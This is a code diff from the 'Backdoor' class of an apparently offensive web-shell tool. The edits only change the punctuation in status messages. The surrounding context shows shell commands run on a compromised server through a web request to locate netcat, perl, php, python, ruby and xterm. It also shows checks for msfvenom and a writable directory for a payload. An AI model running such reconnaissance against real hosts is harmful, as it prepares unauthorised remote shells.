@@ -36,7 +36,7 @@ class Backdoor(object):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
         else:
-            print '\n{0}[i] Found the metasploit framework!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found the metasploit framework:'.format(Colors.GREEN, Colors.END)
             folder = linux.get_writble_dir()
             if folder:
                 filename = ''.join(choice(string.ascii_letters + string.digits) for x in range(8))
@@ -58,7 +58,7 @@ class Backdoor(object):
         cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         netcat = make_request.get_page_source(cmd)
         if netcat:
-            print '\n{0}[i] Found netcat!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found netcat:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in netcat:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
@@ -76,7 +76,7 @@ class Backdoor(object):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         perl = make_request.get_page_source(cmd)
         if perl:
-            print '\n{0}[i] Found perl!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found perl:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in perl:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
@@ -163,7 +163,7 @@ class Backdoor(object):
         cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         php = make_request.get_page_source(cmd)
         if php:
-            print '\n{0}[i] Found php-cli!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found php-cli:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in php:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
@@ -182,7 +182,7 @@ class Backdoor(object):
         cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         python = make_request.get_page_source(cmd)
         if python:
-            print '\n{0}[i] Found python!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found python:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in python:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
@@ -206,7 +206,7 @@ class Backdoor(object):
         cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         ruby = make_request.get_page_source(cmd)
         if ruby:
-            print '\n{0}[i] Found ruby!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found ruby:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in ruby:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
@@ -242,7 +242,7 @@ class Backdoor(object):
         cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         xterm = make_request.get_page_source(cmd)
         if xterm:
-            print '\n{0}[i] Found xterm!'.format(Colors.GREEN, Colors.END)
+            print '\n{0}[i] Found xterm:'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in xterm:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
